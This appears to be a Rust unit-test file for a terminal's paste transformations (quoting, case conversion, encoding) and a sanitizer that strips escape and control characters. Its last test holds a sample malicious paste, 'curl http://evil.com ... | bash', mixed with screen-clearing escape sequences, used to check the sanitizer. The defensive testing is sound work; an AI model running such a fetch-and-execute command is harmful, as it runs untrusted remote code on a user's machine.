//! Tests for paste transformations and content sanitization.

use super::{PasteTransform, sanitize_paste_content, transform};

// Shell transformations
#[test]
fn test_shell_single_quotes() {
    assert_eq!(
        transform("hello world", PasteTransform::ShellSingleQuotes)
            .expect("transform should succeed"),
        "'hello world'"
    );
    assert_eq!(
        transform("it's a test", PasteTransform::ShellSingleQuotes)
            .expect("transform should succeed"),
        "'it'\\''s a test'"
    );
}

#[test]
fn test_shell_double_quotes() {
    assert_eq!(
        transform("hello world", PasteTransform::ShellDoubleQuotes)
            .expect("transform should succeed"),
        "\"hello world\""
    );
    assert_eq!(
        transform("$HOME/file", PasteTransform::ShellDoubleQuotes)
            .expect("transform should succeed"),
        "\"\\$HOME/file\""
    );
}

#[test]
fn test_shell_backslash() {
    assert_eq!(
        transform("hello world", PasteTransform::ShellBackslash)
            .expect("transform should succeed"),
        "hello\\ world"
    );
    assert_eq!(
        transform("$var", PasteTransform::ShellBackslash).expect("transform should succeed"),
        "\\$var"
    );
}

// Case transformations
#[test]
fn test_case_uppercase() {
    assert_eq!(
        transform("Hello World", PasteTransform::CaseUppercase)
            .expect("transform should succeed"),
        "HELLO WORLD"
    );
}

#[test]
fn test_case_lowercase() {
    assert_eq!(
        transform("Hello World", PasteTransform::CaseLowercase)
            .expect("transform should succeed"),
        "hello world"
    );
}

#[test]
fn test_case_title_case() {
    assert_eq!(
        transform("hello world", PasteTransform::CaseTitleCase)
            .expect("transform should succeed"),
        "Hello World"
    );
    assert_eq!(
        transform("hello-world", PasteTransform::CaseTitleCase)
            .expect("transform should succeed"),
        "Hello-World"
    );
}

#[test]
fn test_case_camel_case() {
    assert_eq!(
        transform("hello world", PasteTransform::CaseCamelCase)
            .expect("transform should succeed"),
        "helloWorld"
    );
    assert_eq!(
        transform("Hello World", PasteTransform::CaseCamelCase)
            .expect("transform should succeed"),
        "helloWorld"
    );
    assert_eq!(
        transform("hello_world", PasteTransform::CaseCamelCase)
            .expect("transform should succeed"),
        "helloWorld"
    );
}

#[test]
fn test_case_pascal_case() {
    assert_eq!(
        transform("hello world", PasteTransform::CasePascalCase)
            .expect("transform should succeed"),
        "HelloWorld"
    );
}

#[test]
fn test_case_snake_case() {
    assert_eq!(
        transform("Hello World", PasteTransform::CaseSnakeCase)
            .expect("transform should succeed"),
        "hello_world"
    );
    assert_eq!(
        transform("helloWorld", PasteTransform::CaseSnakeCase)
            .expect("transform should succeed"),
        "hello_world"
    );
}

#[test]
fn test_case_screaming_snake() {
    assert_eq!(
        transform("Hello World", PasteTransform::CaseScreamingSnake)
            .expect("transform should succeed"),
        "HELLO_WORLD"
    );
}

#[test]
fn test_case_kebab_case() {
    assert_eq!(
        transform("Hello World", PasteTransform::CaseKebabCase)
            .expect("transform should succeed"),
        "hello-world"
    );
}

// Newline transformations
#[test]
fn test_newline_single_line() {
    assert_eq!(
        transform("line1\nline2\nline3", PasteTransform::NewlineSingleLine)
            .expect("transform should succeed"),
        "line1 line2 line3"
    );
    assert_eq!(
        transform("single line", PasteTransform::NewlineSingleLine)
            .expect("transform should succeed"),
        "single line"
    );
}

#[test]
fn test_newline_add_newlines() {
    assert_eq!(
        transform("line1\nline2", PasteTransform::NewlineAddNewlines)
            .expect("transform should succeed"),
        "line1\nline2\n"
    );
    // Already has trailing newline
    assert_eq!(
        transform("line1\nline2\n", PasteTransform::NewlineAddNewlines)
            .expect("transform should succeed"),
        "line1\nline2\n"
    );
}

#[test]
fn test_newline_remove_newlines() {
    assert_eq!(
        transform("line1\nline2\nline3", PasteTransform::NewlineRemoveNewlines)
            .expect("transform should succeed"),
        "line1line2line3"
    );
    assert_eq!(
        transform("line1\r\nline2", PasteTransform::NewlineRemoveNewlines)
            .expect("transform should succeed"),
        "line1line2"
    );
}

// Whitespace transformations
#[test]
fn test_whitespace_trim() {
    assert_eq!(
        transform("  hello  ", PasteTransform::WhitespaceTrim)
            .expect("transform should succeed"),
        "hello"
    );
}

#[test]
fn test_whitespace_trim_lines() {
    assert_eq!(
        transform("  line1  \n  line2  ", PasteTransform::WhitespaceTrimLines)
            .expect("transform should succeed"),
        "line1\nline2"
    );
}

#[test]
fn test_whitespace_collapse_spaces() {
    assert_eq!(
        transform("hello    world", PasteTransform::WhitespaceCollapseSpaces)
            .expect("transform should succeed"),
        "hello world"
    );
}

#[test]
fn test_whitespace_tabs_to_spaces() {
    assert_eq!(
        transform("hello\tworld", PasteTransform::WhitespaceTabsToSpaces)
            .expect("transform should succeed"),
        "hello    world"
    );
}

#[test]
fn test_whitespace_spaces_to_tabs() {
    assert_eq!(
        transform("hello    world", PasteTransform::WhitespaceSpacesToTabs)
            .expect("transform should succeed"),
        "hello\tworld"
    );
}

#[test]
fn test_whitespace_remove_empty_lines() {
    assert_eq!(
        transform(
            "line1\n\nline2\n  \nline3",
            PasteTransform::WhitespaceRemoveEmptyLines
        )
        .expect("transform should succeed"),
        "line1\nline2\nline3"
    );
}

#[test]
fn test_whitespace_normalize_line_endings() {
    assert_eq!(
        transform(
            "line1\r\nline2\rline3",
            PasteTransform::WhitespaceNormalizeLineEndings
        )
        .expect("transform should succeed"),
        "line1\nline2\nline3"
    );
}

// Encoding transformations
#[test]
fn test_encode_base64() {
    assert_eq!(
        transform("hello", PasteTransform::EncodeBase64).expect("transform should succeed"),
        "aGVsbG8="
    );
    assert_eq!(
        transform("Hello World!", PasteTransform::EncodeBase64)
            .expect("transform should succeed"),
        "SGVsbG8gV29ybGQh"
    );
}

#[test]
fn test_decode_base64() {
    assert_eq!(
        transform("aGVsbG8=", PasteTransform::DecodeBase64).expect("transform should succeed"),
        "hello"
    );
    assert_eq!(
        transform("SGVsbG8gV29ybGQh", PasteTransform::DecodeBase64)
            .expect("transform should succeed"),
        "Hello World!"
    );
}

#[test]
fn test_base64_roundtrip() {
    let original = "The quick brown fox jumps over the lazy dog!";
    let encoded =
        transform(original, PasteTransform::EncodeBase64).expect("encode should succeed");
    let decoded =
        transform(&encoded, PasteTransform::DecodeBase64).expect("decode should succeed");
    assert_eq!(decoded, original);
}

#[test]
fn test_encode_url() {
    assert_eq!(
        transform("hello world", PasteTransform::EncodeUrl).expect("transform should succeed"),
        "hello%20world"
    );
    assert_eq!(
        transform("a=b&c=d", PasteTransform::EncodeUrl).expect("transform should succeed"),
        "a%3Db%26c%3Dd"
    );
}

#[test]
fn test_decode_url() {
    assert_eq!(
        transform("hello%20world", PasteTransform::DecodeUrl)
            .expect("transform should succeed"),
        "hello world"
    );
    assert_eq!(
        transform("hello+world", PasteTransform::DecodeUrl).expect("transform should succeed"),
        "hello world"
    );
}

#[test]
fn test_url_roundtrip() {
    let original = "hello world! & goodbye=yes";
    let encoded =
        transform(original, PasteTransform::EncodeUrl).expect("encode should succeed");
    let decoded =
        transform(&encoded, PasteTransform::DecodeUrl).expect("decode should succeed");
    assert_eq!(decoded, original);
}

#[test]
fn test_encode_hex() {
    assert_eq!(
        transform("hello", PasteTransform::EncodeHex).expect("transform should succeed"),
        "68656c6c6f"
    );
}

#[test]
fn test_decode_hex() {
    assert_eq!(
        transform("68656c6c6f", PasteTransform::DecodeHex).expect("transform should succeed"),
        "hello"
    );
    assert_eq!(
        transform("0x68656c6c6f", PasteTransform::DecodeHex).expect("transform should succeed"),
        "hello"
    );
}

#[test]
fn test_hex_roundtrip() {
    let original = "Hello World!";
    let encoded =
        transform(original, PasteTransform::EncodeHex).expect("encode should succeed");
    let decoded =
        transform(&encoded, PasteTransform::DecodeHex).expect("decode should succeed");
    assert_eq!(decoded, original);
}

#[test]
fn test_encode_json_escape() {
    assert_eq!(
        transform("hello\nworld", PasteTransform::EncodeJsonEscape)
            .expect("transform should succeed"),
        "hello\\nworld"
    );
    assert_eq!(
        transform("say \"hi\"", PasteTransform::EncodeJsonEscape)
            .expect("transform should succeed"),
        "say \\\"hi\\\""
    );
}

#[test]
fn test_decode_json_unescape() {
    assert_eq!(
        transform("hello\\nworld", PasteTransform::DecodeJsonUnescape)
            .expect("transform should succeed"),
        "hello\nworld"
    );
    assert_eq!(
        transform("say \\\"hi\\\"", PasteTransform::DecodeJsonUnescape)
            .expect("transform should succeed"),
        "say \"hi\""
    );
}

#[test]
fn test_json_roundtrip() {
    let original = "Line1\nLine2\tTabbed \"quoted\"";
    let encoded =
        transform(original, PasteTransform::EncodeJsonEscape).expect("encode should succeed");
    let decoded =
        transform(&encoded, PasteTransform::DecodeJsonUnescape).expect("decode should succeed");
    assert_eq!(decoded, original);
}

// Edge cases
#[test]
fn test_empty_string() {
    for transform_type in PasteTransform::all() {
        let result = transform("", *transform_type);
        assert!(
            result.is_ok(),
            "Transform {:?} failed on empty string",
            transform_type
        );
    }
}

#[test]
fn test_unicode() {
    // Uppercase preserves emojis
    assert_eq!(
        transform("Hello! ", PasteTransform::CaseUppercase).expect("transform should succeed"),
        "HELLO! "
    );
    // Base64 encoding of emoji (rocket is F0 9F 9A 81 in UTF-8)
    let encoded =
        transform("", PasteTransform::EncodeBase64).expect("transform should succeed");
    let decoded =
        transform(&encoded, PasteTransform::DecodeBase64).expect("decode should succeed");
    assert_eq!(decoded, "");
}

#[test]
fn test_fuzzy_match() {
    // Substring matching on display name
    assert!(PasteTransform::EncodeBase64.matches_query("base"));
    assert!(PasteTransform::EncodeBase64.matches_query("Base64"));
    assert!(PasteTransform::ShellSingleQuotes.matches_query("shell"));
    assert!(PasteTransform::ShellSingleQuotes.matches_query("single"));
    assert!(PasteTransform::CaseUppercase.matches_query("upper"));
    assert!(PasteTransform::CaseUppercase.matches_query("CASE"));
    assert!(PasteTransform::CaseUppercase.matches_query("")); // empty matches all
    assert!(!PasteTransform::CaseUppercase.matches_query("xyz"));
}

// Error cases
#[test]
fn test_invalid_base64() {
    let result = transform("not valid base64!!!", PasteTransform::DecodeBase64);
    assert!(result.is_err());
}

#[test]
fn test_invalid_hex() {
    let result = transform("xyz", PasteTransform::DecodeHex);
    assert!(result.is_err());

    let result = transform("abc", PasteTransform::DecodeHex); // odd length
    assert!(result.is_err());
}

#[test]
fn test_invalid_url_encoding() {
    let result = transform("%ZZ", PasteTransform::DecodeUrl);
    assert!(result.is_err());
}

// ========================================================================
// Paste content sanitization tests
// ========================================================================

#[test]
fn test_sanitize_normal_text_unchanged() {
    assert_eq!(sanitize_paste_content("Hello, world!"), "Hello, world!");
    assert_eq!(
        sanitize_paste_content("ls -la /tmp && echo done"),
        "ls -la /tmp && echo done"
    );
    assert_eq!(
        sanitize_paste_content("foo@bar.com 123 $HOME ~user"),
        "foo@bar.com 123 $HOME ~user"
    );
}

#[test]
fn test_sanitize_preserves_tab_newline_cr() {
    assert_eq!(sanitize_paste_content("a\tb"), "a\tb");
    assert_eq!(sanitize_paste_content("line1\nline2"), "line1\nline2");
    assert_eq!(sanitize_paste_content("line1\r\nline2"), "line1\r\nline2");
    assert_eq!(
        sanitize_paste_content("col1\tcol2\nrow2\r\n"),
        "col1\tcol2\nrow2\r\n"
    );
}

#[test]
fn test_sanitize_strips_esc() {
    assert_eq!(sanitize_paste_content("\x1b[31mred\x1b[0m"), "[31mred[0m");
    assert_eq!(
        sanitize_paste_content("\x1b]0;evil title\x07"),
        "]0;evil title"
    );
}

#[test]
fn test_sanitize_strips_c0_controls() {
    assert_eq!(sanitize_paste_content("a\x00b"), "ab");
    assert_eq!(sanitize_paste_content("a\x07b"), "ab"); // BEL
    assert_eq!(sanitize_paste_content("a\x08b"), "ab"); // BS
    assert_eq!(sanitize_paste_content("a\x01\x02\x03b"), "ab");
    assert_eq!(sanitize_paste_content("a\x1ab"), "ab");
}

#[test]
fn test_sanitize_strips_del() {
    assert_eq!(sanitize_paste_content("a\x7fb"), "ab");
}

#[test]
fn test_sanitize_strips_c1_controls() {
    let csi = '\u{009B}';
    let input = format!("a{}31mb", csi);
    assert_eq!(sanitize_paste_content(&input), "a31mb");

    assert_eq!(sanitize_paste_content("a\u{0080}b"), "ab");
    assert_eq!(sanitize_paste_content("a\u{0085}b"), "ab"); // NEL
    assert_eq!(sanitize_paste_content("a\u{008D}b"), "ab"); // RI
    assert_eq!(sanitize_paste_content("a\u{009F}b"), "ab");
}

#[test]
fn test_sanitize_preserves_unicode() {
    assert_eq!(
        sanitize_paste_content("Hello \u{00A0}World"),
        "Hello \u{00A0}World"
    ); // NBSP
    assert_eq!(sanitize_paste_content(""), "");
    assert_eq!(
        sanitize_paste_content("\u{4F60}\u{597D}"),
        "\u{4F60}\u{597D}"
    ); // Chinese: 你好
    assert_eq!(sanitize_paste_content("caf\u{00E9}"), "caf\u{00E9}"); // café
    assert_eq!(sanitize_paste_content("\u{1F600}"), "\u{1F600}"); // Emoji: 😀
}

#[test]
fn test_sanitize_empty_string() {
    assert_eq!(sanitize_paste_content(""), "");
}

#[test]
fn test_sanitize_mixed_dangerous_and_safe() {
    let malicious = "curl http://evil.com\x1b[2J\x1b[H | bash";
    assert_eq!(
        sanitize_paste_content(malicious),
        "curl http://evil.com[2J[H | bash"
    );
}
